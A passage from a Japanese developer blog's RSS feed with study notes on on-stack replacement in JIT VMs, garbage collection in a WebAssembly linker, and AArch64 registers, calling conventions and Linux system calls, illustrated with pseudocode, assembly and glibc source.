&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fdocs.oracle.com%2Fen%2Fgraalvm%2Fenterprise%2F21%2Fdocs%2Fgraalvm-as-a-platform%2Flanguage-implementation-framework%2FOnStackReplacement%2F&quot; title=&quot;On-Stack Replacement (OSR)&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://docs.oracle.com/en/graalvm/enterprise/21/docs/graalvm-as-a-platform/language-implementation-framework/OnStackReplacement/&quot;&gt;docs.oracle.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fnothingcosmos.github.io%2FOpenJDKOverview%2Fsrc%2Fosr.html&quot; title=&quot;On-Stack Replacement — OpenJDK Internals 1.0 documentation&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://nothingcosmos.github.io/OpenJDKOverview/src/osr.html&quot;&gt;nothingcosmos.github.io&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;文献によると、OSRは基本的には、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A5%D7%A5%EA%A5%BF&quot;&gt;インタプリタ&lt;/a&gt;の途中から&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/JIT&quot;&gt;JIT&lt;/a&gt;コードに移るための手法。
以下の.NETのドキュメントがとても詳しい。&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Fdotnet%2Fruntime%2Fblob%2Fmain%2Fdocs%2Fdesign%2Ffeatures%2FOnStackReplacement.md&quot; title=&quot;runtime/docs/design/features/OnStackReplacement.md at main · dotnet/runtime&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/runtime/blob/main/docs/design/features/OnStackReplacement.md&quot;&gt;github.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;OSRを行うポイントは&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GC&quot;&gt;GC&lt;/a&gt;を行うポイントと似ているという言及がある。また、Design Principlesに書かれている以下の2点は実装する上で重要だと感じた。生成するコードや&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A5%D7%A5%EA%A5%BF&quot;&gt;インタプリタ&lt;/a&gt;にオーバーヘッドを追加することは極力避けたい。また、OSRが実際に行われたときに、大部分のオーバーヘッドが発生するべきである。&lt;/p&gt;

&lt;blockquote&gt;&lt;ul&gt;
&lt;li&gt;Pay as you go. The costs of OSR should be limited to methods that can benefit from OSR, and where possible, paid largely when OSR actually happens.&lt;/li&gt;
&lt;li&gt;Impose few restrictions on optimized &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/codegen&quot;&gt;codegen&lt;/a&gt;. We should not have to restrict or dumb down optimized &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/codegen&quot;&gt;codegen&lt;/a&gt; to allow transitions to it via OSR&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;さらに調べること&quot;&gt;さらに調べること&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;当時の論文を読んで、お気持ちをさらに理解する&lt;/li&gt;
&lt;li&gt;ア&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A4%A5%C7%A5%A2&quot;&gt;イデア&lt;/a&gt;はわかったが実装がいまいちわからない(そもそも&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/JIT&quot;&gt;JIT&lt;/a&gt; &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/VM&quot;&gt;VM&lt;/a&gt;を作ったことがないので)&lt;/li&gt;
&lt;li&gt;deoptまわりの処理を具体的に知りたい。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;の退避、ネイティブスタックと&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/VM&quot;&gt;VM&lt;/a&gt;スタックの協調&lt;/li&gt;
&lt;li&gt;異なる&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3&quot;&gt;アーキテクチャ&lt;/a&gt;間でのOSR&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;でやってる人はすでにいるか?&lt;/li&gt;
&lt;/ul&gt;

</description>          <pubDate>Mon, 10 Jun 2024 17:01:51 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6801883189113242667</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/6801883189113242667/1718006511" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>WebAssemblyリンカのGC</title>
          <link>https://tamaron.hatenablog.com/entry/2024/04/16/152955</link>          <description>&lt;h2 id=&quot;GCの基本&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GC&quot;&gt;GC&lt;/a&gt;の基本&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GC&quot;&gt;GC&lt;/a&gt; = garbege collection (&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC&quot;&gt;プログラミング言語&lt;/a&gt;のランタイムの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GC&quot;&gt;GC&lt;/a&gt;とは異なる)&lt;/li&gt;
&lt;li&gt;リンカに渡されたすべてのコード(データ)を愚直にすべて出力すると、サイズが大きくなりすぎてしまう。&lt;/li&gt;
&lt;li&gt;出力ファイルは使われるコード(データ)のみを含むようにしたい。&lt;/li&gt;
&lt;li&gt;入力ファイルのセクションを最小単位として、サイズを最適化する&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;(Wasmの場合、ディス&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EB&quot;&gt;アセンブル&lt;/a&gt;せずにCodeセクションをそれぞれの関数本体を分割できるため、関数単位で&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GC&quot;&gt;GC&lt;/a&gt;が行われるのかと誤解していた...)&lt;/p&gt;

&lt;h2 id=&quot;アルゴリズム&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;mark and sweep &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GC&quot;&gt;GC&lt;/a&gt;のmarkと同じ原理で使われるセクションを&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%BA%C6%B5%A2&quot;&gt;再帰&lt;/a&gt;的にマークする。つまり、明らかに使われるシンボルから初めて、関数呼び出しや&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4&quot;&gt;グローバル変数&lt;/a&gt;のアクセスによって辿りつけるセクションをマークしていく。リロケータブルなオブジェクトファイルは関数呼び出しや&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4&quot;&gt;グローバル変数&lt;/a&gt;へのアクセスに対して、リロケーションを持つ。&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;&lt;span class=&quot;synType&quot;&gt;int&lt;/span&gt; ret = &lt;span class=&quot;synConstant&quot;&gt;42&lt;/span&gt;;

&lt;span class=&quot;synType&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;main&lt;/span&gt;() {
    &lt;span class=&quot;synStatement&quot;&gt;return&lt;/span&gt; ret;
}
&lt;/pre&gt;


&lt;p&gt;例えば、上記のコードを&lt;code&gt;-c&lt;/code&gt;をつけて&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;すると、以下のようなリロケーションが生成される。(&lt;code&gt;__stack_pointer&lt;/code&gt;はリンカが生成する特別なシンボル)&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;  - relocations for section: 4 (Code) [3]
   - R_WASM_GLOBAL_INDEX_LEB offset=0x000006(file=0x00008c) symbol=1 &amp;lt;env.__stack_pointer&amp;gt;
   - R_WASM_MEMORY_ADDR_LEB offset=0x00002b(file=0x0000b1) symbol=2 &amp;lt;ret&amp;gt;
   - R_WASM_FUNCTION_INDEX_LEB offset=0x00003b(file=0x0000c1) symbol=0 &amp;lt;__main_void&amp;gt;&lt;/pre&gt;


&lt;p&gt;wasmの場合はこの最初のセクションはエントリーポイント、no-stripなシンボル、init functionが所属するセクションとretained segmentsが該当する。(init functionsは&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4&quot;&gt;グローバル変数&lt;/a&gt;のコンスト&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%E9%A5%AF&quot;&gt;ラク&lt;/a&gt;タであることを示す関数のフラグである。)&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Fllvm%2Fllvm-project%2Fblob%2Fe6f63a942a45e3545332cd9a43982a69a4d5667b%2Flld%2Fwasm%2FMarkLive.cpp%23L105&quot; title=&quot;llvm-project/lld/wasm/MarkLive.cpp at e6f63a942a45e3545332cd9a43982a69a4d5667b · llvm/llvm-project&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://github.com/llvm/llvm-project/blob/e6f63a942a45e3545332cd9a43982a69a4d5667b/lld/wasm/MarkLive.cpp#L105&quot;&gt;github.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%B5%BC%BB%F7%A5%B3%A1%BC%A5%C9&quot;&gt;擬似コード&lt;/a&gt;は以下のようになる。&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;set visited;
stack work_list;
&lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; each section
  &lt;span class=&quot;synStatement&quot;&gt;if&lt;/span&gt; section is a GC root {
    work_list.&lt;span class=&quot;synIdentifier&quot;&gt;push_back&lt;/span&gt;(section);
    visited.&lt;span class=&quot;synIdentifier&quot;&gt;insert&lt;/span&gt;(section);
  }
&lt;span class=&quot;synStatement&quot;&gt;while&lt;/span&gt; (work_list.&lt;span class=&quot;synIdentifier&quot;&gt;size&lt;/span&gt;()) {
  section sec = work_list.&lt;span class=&quot;synIdentifier&quot;&gt;back&lt;/span&gt;();
  work_list.&lt;span class=&quot;synIdentifier&quot;&gt;pop_back&lt;/span&gt;();
  &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; each section referenced by sec
    &lt;span class=&quot;synStatement&quot;&gt;if&lt;/span&gt; (visited.&lt;span class=&quot;synIdentifier&quot;&gt;insert&lt;/span&gt;(section))
      work_list.&lt;span class=&quot;synIdentifier&quot;&gt;push_back&lt;/span&gt;(section);
}
&lt;/pre&gt;


&lt;p&gt;from
&lt;a href=&quot;https://maskray.me/blog/2021-02-28-linker-garbage-collection&quot;&gt;https://maskray.me/blog/2021-02-28-linker-garbage-collection&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fmaskray.me%2Fblog%2F2021-02-28-linker-garbage-collection&quot; title=&quot;Linker garbage collection&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://maskray.me/blog/2021-02-28-linker-garbage-collection&quot;&gt;maskray.me&lt;/a&gt;&lt;/cite&gt;&lt;/li&gt;
&lt;li&gt;lld, &lt;a href=&quot;https://github.com/llvm/llvm-project&quot;&gt;https://github.com/llvm/llvm-project&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;zld, &lt;a href=&quot;https://github.com/kubkon/zld&quot;&gt;https://github.com/kubkon/zld&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>          <pubDate>Tue, 16 Apr 2024 15:29:55 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6801883189099023498</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/6801883189099023498/1713249117" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>AArch64 (Arm v8) についてのメモ (レジスタ,関数呼び出し,システムコール)</title>
          <link>https://tamaron.hatenablog.com/entry/2024/03/24/010752</link>          <description>&lt;p&gt;AArch64→&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/x86-64&quot;&gt;x86-64&lt;/a&gt;のバイナリ変換について調べていときのAArch64のメモ&lt;/p&gt;

&lt;h2 id=&quot;Instruction-Set&quot;&gt;Instruction Set&lt;/h2&gt;

&lt;p&gt;Arm v8は3つの命令セットをサポートしている。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A32 (=ARM)&lt;/li&gt;
&lt;li&gt;T32 (=Thumb2)&lt;/li&gt;
&lt;li&gt;A64&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;A32とT32はどちらも32bitで、これらをまとめてAArch32という。
A32とT32は&lt;code&gt;MOV PC&lt;/code&gt;, &lt;code&gt;LDR PC&lt;/code&gt;などの特別な命令でモードをが切り替わる。&lt;/p&gt;

&lt;p&gt;A64は64bitの命令セットでAArch32に対してAArch64という。&lt;/p&gt;

&lt;h2 id=&quot;Registers&quot;&gt;Registers&lt;/h2&gt;

&lt;h4 id=&quot;GP-registers&quot;&gt;GP registers&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;r0~r31: GPR&lt;/li&gt;
&lt;li&gt;w0~w31: 32bitとして利用する場合の名称&lt;/li&gt;
&lt;li&gt;x0~&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/x32&quot;&gt;x32&lt;/a&gt;: 64bitとして利用する場合の名称&lt;/li&gt;
&lt;/ul&gt;


&lt;h4 id=&quot;Dedicated-registers&quot;&gt;Dedicated registers&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;r29: frame pointer(fp)&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/r30&quot;&gt;r30&lt;/a&gt;: link register (lr): リターンアドレス専用&lt;/li&gt;
&lt;li&gt;r31: ゼロ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;(xzr/wzr)として使われる&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&quot;Mnemonic&quot;&gt;Mnemonic&lt;/h2&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/ldr&quot;&gt;ldr&lt;/a&gt;はLoad registerの略。
&lt;code&gt;[w1, 12]&lt;/code&gt;は&lt;code&gt;w1+12&lt;/code&gt;の意味。&lt;/p&gt;

&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;&lt;span class=&quot;synIdentifier&quot;&gt;ldr&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;w0&lt;/span&gt;,[&lt;span class=&quot;synIdentifier&quot;&gt;w1&lt;/span&gt;,&lt;span class=&quot;synConstant&quot;&gt;12&lt;/span&gt;] 
&lt;/pre&gt;


&lt;h2 id=&quot;Calling-convention&quot;&gt;Calling convention&lt;/h2&gt;

&lt;p&gt;aapcs64ではこのように定められている。&lt;/p&gt;

&lt;p&gt;&lt;figure class=&quot;figure-image figure-image-fotolife&quot; title=&quot;https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst#general-purpose-registers&quot;&gt;&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20240323/20240323185819.png&quot; width=&quot;1200&quot; height=&quot;565&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;figcaption&gt;&lt;a href=&quot;https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst#general-purpose-registers&quot;&gt;https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst#general-purpose-registers&lt;/a&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;parameter passing/return &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/value&quot;&gt;value&lt;/a&gt;につかわれる&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;はデータ型で決まる (aapcs64, 6.9節)&lt;/p&gt;

&lt;h2 id=&quot;例&quot;&gt;例&lt;/h2&gt;

&lt;p&gt;以下のCプログラムを&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;して眺めてみる。&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgodbolt.org%2Fz%2F3P51b7o5Y&quot; title=&quot;Compiler Explorer - C++&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://godbolt.org/z/3P51b7o5Y&quot;&gt;godbolt.org&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;&lt;span class=&quot;synType&quot;&gt;struct&lt;/span&gt; S {
    &lt;span class=&quot;synType&quot;&gt;char&lt;/span&gt; c[&lt;span class=&quot;synConstant&quot;&gt;3000&lt;/span&gt;];
};

&lt;span class=&quot;synType&quot;&gt;static&lt;/span&gt; S s;

S &lt;span class=&quot;synIdentifier&quot;&gt;foo&lt;/span&gt;() {
    &lt;span class=&quot;synStatement&quot;&gt;return&lt;/span&gt; s;
}
&lt;/pre&gt;




&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;&lt;span class=&quot;synIdentifier&quot;&gt;foo&lt;/span&gt;():                                &lt;span class=&quot;synComment&quot;&gt;// @foo()&lt;/span&gt;
        &lt;span class=&quot;synIdentifier&quot;&gt;stp&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;x29&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;x30&lt;/span&gt;, [&lt;span class=&quot;synIdentifier&quot;&gt;sp&lt;/span&gt;, &lt;span class=&quot;synComment&quot;&gt;#-16]!           // 16-byte Folded Spill&lt;/span&gt;
        &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;x29&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;sp&lt;/span&gt;
        &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;x0&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;x8&lt;/span&gt;
        &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;x2&lt;/span&gt;, &lt;span class=&quot;synComment&quot;&gt;#3000                       // =0xbb8&lt;/span&gt;
        &lt;span class=&quot;synIdentifier&quot;&gt;adrp&lt;/span&gt;    &lt;span class=&quot;synIdentifier&quot;&gt;x1&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;_ZL1s&lt;/span&gt;
        &lt;span class=&quot;synIdentifier&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;x1&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;x1&lt;/span&gt;, :&lt;span class=&quot;synIdentifier&quot;&gt;lo12&lt;/span&gt;:&lt;span class=&quot;synIdentifier&quot;&gt;_ZL1s&lt;/span&gt;
        &lt;span class=&quot;synIdentifier&quot;&gt;bl&lt;/span&gt;      &lt;span class=&quot;synIdentifier&quot;&gt;memcpy&lt;/span&gt;
        &lt;span class=&quot;synIdentifier&quot;&gt;ldp&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;x29&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;x30&lt;/span&gt;, [&lt;span class=&quot;synIdentifier&quot;&gt;sp&lt;/span&gt;], &lt;span class=&quot;synComment&quot;&gt;#16             // 16-byte Folded Reload&lt;/span&gt;
        &lt;span class=&quot;synIdentifier&quot;&gt;ret&lt;/span&gt;
&lt;/pre&gt;


&lt;h4 id=&quot;関数プロローグ&quot;&gt;関数プロローグ&lt;/h4&gt;

&lt;p&gt;pc(x30)とfp(x29)の退避が行われる。&lt;/p&gt;

&lt;p&gt;もう一つ重要なのは、fooは無引数なのにx8をパラメータとして受け取っていること。
fooはサイズが大きな構造体を返す関数であるため、callerはメモリ領域を確保してx0を介してcalleeにそのメモリアドレスを渡す。
そして、calleeがそのアドレスに結果を書き込む。&lt;/p&gt;

&lt;p&gt;aapcs64より:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;the caller shall reserve a block of memory of sufficient size and alignment to hold the result. The
address of the memory block shall be passed as an additional argument to the function in x8. The callee may
modify the result memory block at any point during the execution of the subroutine&lt;/p&gt;&lt;/blockquote&gt;

&lt;h4 id=&quot;本体&quot;&gt;本体&lt;/h4&gt;

&lt;p&gt;aarchにはcall命令はないので、そのかわりにbl (branch and linkの略かな?)を使う。
memcpyの戻り値はアドレス(8byte)なのでr0で受け渡しする。&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;&lt;span class=&quot;synType&quot;&gt;void&lt;/span&gt;* &lt;span class=&quot;synIdentifier&quot;&gt;memcpy &lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;void&lt;/span&gt; *dstpp, &lt;span class=&quot;synType&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;void&lt;/span&gt; *srcpp, &lt;span class=&quot;synType&quot;&gt;size_t&lt;/span&gt; len);
&lt;/pre&gt;


&lt;h4 id=&quot;関数エピローグ&quot;&gt;関数エピローグ&lt;/h4&gt;

&lt;p&gt;pcとfpを復元する&lt;/p&gt;

&lt;h2 id=&quot;System-call-Linux&quot;&gt;System call (&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;)&lt;/h2&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/glibc&quot;&gt;glibc&lt;/a&gt;の実装を見てみる&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;/* syscall (int nr, ...)&lt;/span&gt;

&lt;span class=&quot;synComment&quot;&gt;   AArch64 system calls take between 0 and 7 arguments. On entry here nr&lt;/span&gt;
&lt;span class=&quot;synComment&quot;&gt;   is in w0 and any other system call arguments are in register x1..x7.&lt;/span&gt;

&lt;span class=&quot;synComment&quot;&gt;   For kernel entry we need to move the system call nr to x8 then&lt;/span&gt;
&lt;span class=&quot;synComment&quot;&gt;   load the remaining arguments to register. */&lt;/span&gt;

&lt;span class=&quot;synIdentifier&quot;&gt;ENTRY &lt;/span&gt;(syscall)
    uxtw    x8, w0
    mov x0, x1
    mov x1, x2
    mov x2, x3
    mov x3, x4
    mov x4, x5
    mov x5, x6
    mov x6, x7
    svc &lt;span class=&quot;synConstant&quot;&gt;0x0&lt;/span&gt;
    cmn x0, #&lt;span class=&quot;synConstant&quot;&gt;4095&lt;/span&gt;
    b.cs    &lt;span class=&quot;synConstant&quot;&gt;1f&lt;/span&gt;
    RET
&lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;:
    b   SYSCALL_ERROR
&lt;span class=&quot;synIdentifier&quot;&gt;PSEUDO_END &lt;/span&gt;(syscall)
&lt;/pre&gt;


&lt;p&gt;&lt;a href=&quot;https://github.com/bminor/glibc/blob/ad05a42370fa09062ff2b450fb69905d9f407643/sysdeps/unix/sysv/linux/aarch64/syscall.S&quot;&gt;https://github.com/bminor/glibc/blob/ad05a42370fa09062ff2b450fb69905d9f407643/sysdeps/unix/sysv/linux/aarch64/syscall.S&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;aarchでは&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/svc&quot;&gt;svc&lt;/a&gt;命令で&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B7%A5%B9%A5%C6%A5%E0%A5%B3%A1%BC%A5%EB&quot;&gt;システムコール&lt;/a&gt;を発行する。(x64でいうsyscall)
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;ではx0~x7に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B7%A5%B9%A5%C6%A5%E0%A5%B3%A1%BC%A5%EB&quot;&gt;システムコール&lt;/a&gt;の引数。x8に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B7%A5%B9%A5%C6%A5%E0%A5%B3%A1%BC%A5%EB&quot;&gt;システムコール&lt;/a&gt;の番号を入れてから&lt;code&gt;svc 0&lt;/code&gt;で呼び出すことがわかる。
(&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/SVC&quot;&gt;SVC&lt;/a&gt;命令は即値を取れるが、どうやら&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;では使われてないっぽい。)
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AB%A1%BC%A5%CD%A5%EB&quot;&gt;カーネル&lt;/a&gt;側でも確かに&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;がこのように使われていることが確認できる。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#arm64-64_bit&quot;&gt;Chromium OS Docs - Linux System Call Table&lt;/a&gt;
b.csはbranch if carry set (carry=1)の意味。&lt;/p&gt;

